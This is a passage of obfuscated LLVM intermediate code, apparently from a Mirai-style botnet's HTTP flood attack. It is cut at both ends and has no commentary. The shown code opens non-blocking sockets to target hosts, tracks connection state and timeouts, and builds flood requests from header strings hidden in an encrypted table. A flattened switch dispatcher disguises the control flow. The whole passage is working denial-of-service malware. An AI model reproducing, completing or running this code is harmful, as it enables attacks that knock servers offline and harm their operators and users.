  %459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %459, i32 0, i32 6
  %461 = getelementptr inbounds [257 x i8], [257 x i8]* %460, i32 0, i32 0
  %462 = load i8*, i8** %17, align 8
  %463 = call i32 @util_strcpy(i8* %461, i8* %462)
  store i32 -915825777, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i32, i32* %9, align 4
  %466 = add nsw i32 %465, 1
  store i32 %466, i32* %9, align 4
  store i32 719720770, i32* %switchVar
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  store i32 2993932, i32* %switchVar
  br label %loopEnd

; <label>:468:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  %469 = call i64 @time(i64* null) #6
  %470 = trunc i64 %469 to i32
  store i32 %470, i32* %27, align 4
  store i32 1173549351, i32* %switchVar
  br label %loopEnd

; <label>:471:                                    ; preds = %loopEntry
  %472 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %473 = getelementptr inbounds [16 x i64], [16 x i64]* %472, i64 0, i64 0
  %474 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %473) #6, !srcloc !1
  %475 = extractvalue { i64, i64* } %474, 0
  %476 = extractvalue { i64, i64* } %474, 1
  %477 = trunc i64 %475 to i32
  store i32 %477, i32* %28, align 4
  %478 = ptrtoint i64* %476 to i64
  %479 = trunc i64 %478 to i32
  store i32 %479, i32* %29, align 4
  store i32 -1135218054, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  store i32 1533881983, i32* %switchVar
  br label %loopEnd

; <label>:481:                                    ; preds = %loopEntry
  %482 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %483 = getelementptr inbounds [16 x i64], [16 x i64]* %482, i64 0, i64 0
  %484 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %483) #6, !srcloc !2
  %485 = extractvalue { i64, i64* } %484, 0
  %486 = extractvalue { i64, i64* } %484, 1
  %487 = trunc i64 %485 to i32
  store i32 %487, i32* %30, align 4
  %488 = ptrtoint i64* %486 to i64
  %489 = trunc i64 %488 to i32
  store i32 %489, i32* %31, align 4
  store i32 1910283891, i32* %switchVar
  br label %loopEnd

; <label>:490:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1407325290, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i32, i32* %9, align 4
  %493 = load i32, i32* %18, align 4
  %494 = icmp slt i32 %492, %493
  %495 = select i1 %494, i32 -708881175, i32 1035090847
  store i32 %495, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  %497 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %498 = load i32, i32* %9, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %497, i64 %499
  store %struct.attack_http_state* %500, %struct.attack_http_state** %26, align 8
  %501 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %501, i32 0, i32 1
  %503 = load i8, i8* %502, align 4
  %504 = zext i8 %503 to i32
  %505 = icmp eq i32 %504, 1
  %506 = select i1 %505, i32 245303177, i32 -1922403405
  store i32 %506, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  %508 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %509 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %508, i32 0, i32 12
  %510 = load i32, i32* %509, align 4
  %511 = icmp ne i32 %510, 0
  %512 = select i1 %511, i32 -1927015537, i32 2073734112
  store i32 %512, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %515 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %514, i32 0, i32 1
  store i8 4, i8* %515, align 4
  store i32 -961160901, i32* %switchVar
  br label %loopEnd

; <label>:516:                                    ; preds = %loopEntry
  %517 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %518 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %517, i32 0, i32 1
  store i8 0, i8* %518, align 4
  store i32 -961160901, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  store i32 -1922403405, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  %521 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %522 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %521, i32 0, i32 1
  %523 = load i8, i8* %522, align 4
  %524 = zext i8 %523 to i32
  %525 = icmp eq i32 %524, 0
  %526 = select i1 %525, i32 629740087, i32 -2047062587
  store i32 %526, i32* %switchVar
  br label %loopEnd

; <label>:527:                                    ; preds = %loopEntry
  %528 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %528, i8 0, i64 16, i32 4, i1 false)
  %529 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %530 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %529, i32 0, i32 0
  %531 = load i32, i32* %530, align 4
  %532 = icmp ne i32 %531, -1
  %533 = select i1 %532, i32 1761052190, i32 1372785237
  store i32 %533, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %535, i32 0, i32 0
  %537 = load i32, i32* %536, align 4
  %538 = call i32 @close(i32 %537)
  store i32 1372785237, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %541 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %542 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %541, i32 0, i32 0
  store i32 %540, i32* %542, align 4
  %543 = icmp eq i32 %540, -1
  %544 = select i1 %543, i32 1952809293, i32 -589036290
  store i32 %544, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  store i32 885830589, i32* %switchVar
  br label %loopEnd

; <label>:546:                                    ; preds = %loopEntry
  %547 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %548 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %547, i32 0, i32 0
  %549 = load i32, i32* %548, align 4
  %550 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %551 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 4
  %553 = call i32 (i32, i32, ...) @fcntl(i32 %552, i32 3, i32 0)
  %554 = or i32 2048, %553
  %555 = call i32 (i32, i32, ...) @fcntl(i32 %549, i32 4, i32 %554)
  store i32 65535, i32* %10, align 4
  %556 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %557 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %556, i32 0, i32 0
  %558 = load i32, i32* %557, align 4
  %559 = bitcast i32* %10 to i8*
  %560 = call i32 @setsockopt(i32 %558, i32 0, i32 8, i8* %559, i32 4) #6
  %561 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %561, align 4
  %562 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %563 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %562, i32 0, i32 4
  %564 = load i32, i32* %563, align 4
  %565 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %566 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %565, i32 0, i32 0
  store i32 %564, i32* %566, align 4
  %567 = load i16, i16* %19, align 2
  %568 = call zeroext i16 @htons(i16 zeroext %567) #7
  %569 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %568, i16* %569, align 2
  %570 = load i32, i32* %27, align 4
  %571 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %572 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %571, i32 0, i32 2
  store i32 %570, i32* %572, align 4
  %573 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %574 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %573, i32 0, i32 1
  store i8 2, i8* %574, align 4
  %575 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %576 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %575, i32 0, i32 0
  %577 = load i32, i32* %576, align 4
  %578 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %579 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %579, %struct.sockaddr** %578, align 8
  %580 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %581 = load %struct.sockaddr*, %struct.sockaddr** %580, align 8
  %582 = call i32 @connect(i32 %577, %struct.sockaddr* %581, i32 16)
  %583 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %584 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %583, i32 0, i32 0
  %585 = load i32, i32* %584, align 4
  %586 = srem i32 %585, 64
  %587 = zext i32 %586 to i64
  %588 = shl i64 1, %587
  %589 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %590 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %591 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %590, i32 0, i32 0
  %592 = load i32, i32* %591, align 4
  %593 = sdiv i32 %592, 64
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds [16 x i64], [16 x i64]* %589, i64 0, i64 %594
  %596 = load i64, i64* %595, align 8
  %597 = or i64 %596, %588
  store i64 %597, i64* %595, align 8
  %598 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %599 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %598, i32 0, i32 0
  %600 = load i32, i32* %599, align 4
  %601 = load i32, i32* %23, align 4
  %602 = icmp sgt i32 %600, %601
  %603 = select i1 %602, i32 1325555622, i32 269347994
  store i32 %603, i32* %switchVar
  br label %loopEnd

; <label>:604:                                    ; preds = %loopEntry
  %605 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %606 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %605, i32 0, i32 0
  %607 = load i32, i32* %606, align 4
  %608 = add nsw i32 %607, 1
  store i32 %608, i32* %23, align 4
  store i32 269347994, i32* %switchVar
  br label %loopEnd

; <label>:609:                                    ; preds = %loopEntry
  store i32 2012520063, i32* %switchVar
  br label %loopEnd

; <label>:610:                                    ; preds = %loopEntry
  %611 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %612 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %611, i32 0, i32 1
  %613 = load i8, i8* %612, align 4
  %614 = zext i8 %613 to i32
  %615 = icmp eq i32 %614, 2
  %616 = select i1 %615, i32 -1378333439, i32 8892531
  store i32 %616, i32* %switchVar
  br label %loopEnd

; <label>:617:                                    ; preds = %loopEntry
  %618 = load i32, i32* %27, align 4
  %619 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %620 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %619, i32 0, i32 2
  %621 = load i32, i32* %620, align 4
  %622 = sub i32 %618, %621
  %623 = icmp ugt i32 %622, 30
  %624 = select i1 %623, i32 1364154164, i32 368420407
  store i32 %624, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  %626 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %627 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %626, i32 0, i32 1
  store i8 0, i8* %627, align 4
  %628 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %629 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %628, i32 0, i32 0
  %630 = load i32, i32* %629, align 4
  %631 = call i32 @close(i32 %630)
  %632 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %632, i32 0, i32 0
  store i32 -1, i32* %633, align 4
  store i32 885830589, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  %635 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %636 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %635, i32 0, i32 0
  %637 = load i32, i32* %636, align 4
  %638 = srem i32 %637, 64
  %639 = zext i32 %638 to i64
  %640 = shl i64 1, %639
  %641 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %642 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %643 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %642, i32 0, i32 0
  %644 = load i32, i32* %643, align 4
  %645 = sdiv i32 %644, 64
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds [16 x i64], [16 x i64]* %641, i64 0, i64 %646
  %648 = load i64, i64* %647, align 8
  %649 = or i64 %648, %640
  store i64 %649, i64* %647, align 8
  %650 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %651 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %650, i32 0, i32 0
  %652 = load i32, i32* %651, align 4
  %653 = load i32, i32* %23, align 4
  %654 = icmp sgt i32 %652, %653
  %655 = select i1 %654, i32 -851970436, i32 807200370
  store i32 %655, i32* %switchVar
  br label %loopEnd

; <label>:656:                                    ; preds = %loopEntry
  %657 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %658 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %657, i32 0, i32 0
  %659 = load i32, i32* %658, align 4
  %660 = add nsw i32 %659, 1
  store i32 %660, i32* %23, align 4
  store i32 807200370, i32* %switchVar
  br label %loopEnd

; <label>:661:                                    ; preds = %loopEntry
  store i32 1254906868, i32* %switchVar
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  %663 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %664 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %663, i32 0, i32 1
  %665 = load i8, i8* %664, align 4
  %666 = zext i8 %665 to i32
  %667 = icmp eq i32 %666, 4
  %668 = select i1 %667, i32 -1869155662, i32 1876940738
  store i32 %668, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  %670 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %671 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %670, i32 0, i32 14
  store i32 -1, i32* %671, align 4
  %672 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %673 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %672, i32 0, i32 11
  store i32 0, i32* %673, align 4
  %674 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %675 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %674, i32 0, i32 18
  %676 = getelementptr inbounds [1024 x i8], [1024 x i8]* %675, i32 0, i32 0
  call void @util_zero(i8* %676, i32 1024)
  %677 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %678 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %677, i32 0, i32 17
  store i32 0, i32* %678, align 4
  %679 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %679, i32 10240)
  %680 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %681 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %682 = call i32 @util_strlen(i8* %681)
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds i8, i8* %680, i64 %683
  %685 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %686 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %685, i32 0, i32 9
  %687 = getelementptr inbounds [9 x i8], [9 x i8]* %686, i32 0, i32 0
  %688 = call i32 @util_strcpy(i8* %684, i8* %687)
  %689 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %690 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %691 = call i32 @util_strlen(i8* %690)
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds i8, i8* %689, i64 %692
  %694 = call i32 @util_strcpy(i8* %693, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %695 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %696 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %697 = call i32 @util_strlen(i8* %696)
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds i8, i8* %695, i64 %698
  %700 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %701 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %700, i32 0, i32 6
  %702 = getelementptr inbounds [257 x i8], [257 x i8]* %701, i32 0, i32 0
  %703 = call i32 @util_strcpy(i8* %699, i8* %702)
  %704 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %705 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %706 = call i32 @util_strlen(i8* %705)
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds i8, i8* %704, i64 %707
  %709 = call i32 @util_strcpy(i8* %708, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %710 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %711 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %712 = call i32 @util_strlen(i8* %711)
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds i8, i8* %710, i64 %713
  %715 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %716 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %715, i32 0, i32 5
  %717 = getelementptr inbounds [512 x i8], [512 x i8]* %716, i32 0, i32 0
  %718 = call i32 @util_strcpy(i8* %714, i8* %717)
  %719 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %720 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %721 = call i32 @util_strlen(i8* %720)
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds i8, i8* %719, i64 %722
  %724 = call i32 @util_strcpy(i8* %723, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %725 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %726 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %727 = call i32 @util_strlen(i8* %726)
  %728 = sext i32 %727 to i64
  %729 = getelementptr inbounds i8, i8* %725, i64 %728
  %730 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %731 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %730, i32 0, i32 7
  %732 = getelementptr inbounds [129 x i8], [129 x i8]* %731, i32 0, i32 0
  %733 = call i32 @util_strcpy(i8* %729, i8* %732)
  %734 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %735 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %736 = call i32 @util_strlen(i8* %735)
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds i8, i8* %734, i64 %737
  %739 = call i32 @util_strcpy(i8* %738, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 57)
  %740 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %741 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %742 = call i32 @util_strlen(i8* %741)
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds i8, i8* %740, i64 %743
  %745 = call i8* @table_retrieve_val(i32 57, i32* null)
  %746 = call i32 @util_strcpy(i8* %744, i8* %745)
  call void @table_lock_val(i8 zeroext 57)
  %747 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %748 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %749 = call i32 @util_strlen(i8* %748)
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds i8, i8* %747, i64 %750
  %752 = call i32 @util_strcpy(i8* %751, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 58)
  %753 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %754 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %755 = call i32 @util_strlen(i8* %754)
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds i8, i8* %753, i64 %756
  %758 = call i8* @table_retrieve_val(i32 58, i32* null)
  %759 = call i32 @util_strcpy(i8* %757, i8* %758)
  call void @table_lock_val(i8 zeroext 58)
  %760 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %761 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %762 = call i32 @util_strlen(i8* %761)
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds i8, i8* %760, i64 %763
  %765 = call i32 @util_strcpy(i8* %764, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 59)
  %766 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %767 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %768 = call i32 @util_strlen(i8* %767)
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds i8, i8* %766, i64 %769
  %771 = call i8* @table_retrieve_val(i32 59, i32* null)
  %772 = call i32 @util_strcpy(i8* %770, i8* %771)
  call void @table_lock_val(i8 zeroext 59)
  %773 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %774 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %775 = call i32 @util_strlen(i8* %774)
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds i8, i8* %773, i64 %776
  %778 = call i32 @util_strcpy(i8* %777, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %779 = load i8*, i8** %14, align 8
  %780 = icmp ne i8* %779, null
  %781 = select i1 %780, i32 794207767, i32 -2123385315
  store i32 %781, i32* %switchVar
  br label %loopEnd

; <label>:782:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 60)
  %783 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %784 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %785 = call i32 @util_strlen(i8* %784)
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds i8, i8* %783, i64 %786
  %788 = call i8* @table_retrieve_val(i32 60, i32* null)
  %789 = call i32 @util_strcpy(i8* %787, i8* %788)
  call void @table_lock_val(i8 zeroext 60)
  %790 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %791 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %792 = call i32 @util_strlen(i8* %791)
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds i8, i8* %790, i64 %793
  %795 = call i32 @util_strcpy(i8* %794, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %796 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %797 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %798 = call i32 @util_strlen(i8* %797)
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds i8, i8* %796, i64 %799
  %801 = call i8* @table_retrieve_val(i32 65, i32* null)
  %802 = call i32 @util_strcpy(i8* %800, i8* %801)
  %803 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %804 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %805 = call i32 @util_strlen(i8* %804)
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds i8, i8* %803, i64 %806
  %808 = call i32 @util_strcpy(i8* %807, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %809 = load i8*, i8** %14, align 8
  %810 = call i32 @util_strlen(i8* %809)
  %811 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %812 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %813 = call i32 @util_strlen(i8* %812)
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds i8, i8* %811, i64 %814
  %816 = call i8* @util_itoa(i32 %810, i32 10, i8* %815)
  %817 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %818 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %819 = call i32 @util_strlen(i8* %818)
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds i8, i8* %817, i64 %820
  %822 = call i32 @util_strcpy(i8* %821, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  store i32 -2123385315, i32* %switchVar
  br label %loopEnd

; <label>:823:                                    ; preds = %loopEntry
  %824 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %825 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %824, i32 0, i32 15
  %826 = load i32, i32* %825, align 4
  %827 = icmp sgt i32 %826, 0
  %828 = select i1 %827, i32 -589379086, i32 -1608476015
  store i32 %828, i32* %switchVar
  br label %loopEnd

; <label>:829:                                    ; preds = %loopEntry
  %830 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %831 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %832 = call i32 @util_strlen(i8* %831)
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds i8, i8* %830, i64 %833
  %835 = call i32 @util_strcpy(i8* %834, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  store i32 -1351009587, i32* %switchVar
  br label %loopEnd

; <label>:836:                                    ; preds = %loopEntry
  %837 = load i32, i32* %10, align 4
  %838 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %839 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %838, i32 0, i32 15
  %840 = load i32, i32* %839, align 4
  %841 = icmp slt i32 %837, %840
  %842 = select i1 %841, i32 -743266048, i32 -1308415083
  store i32 %842, i32* %switchVar
  br label %loopEnd

; <label>:843:                                    ; preds = %loopEntry
  %844 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %845 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %846 = call i32 @util_strlen(i8* %845)
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds i8, i8* %844, i64 %847
  %849 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %850 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %849, i32 0, i32 16
  %851 = load i32, i32* %10, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %850, i64 0, i64 %852
  %854 = getelementptr inbounds [128 x i8], [128 x i8]* %853, i32 0, i32 0
  %855 = call i32 @util_strcpy(i8* %848, i8* %854)
  %856 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %857 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %858 = call i32 @util_strlen(i8* %857)
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds i8, i8* %856, i64 %859
  %861 = call i32 @util_strcpy(i8* %860, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  store i32 -1113079087, i32* %switchVar
  br label %loopEnd

; <label>:862:                                    ; preds = %loopEntry
  %863 = load i32, i32* %10, align 4
  %864 = add nsw i32 %863, 1
  store i32 %864, i32* %10, align 4
  store i32 -1351009587, i32* %switchVar
  br label %loopEnd

; <label>:865:                                    ; preds = %loopEntry
  %866 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %867 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
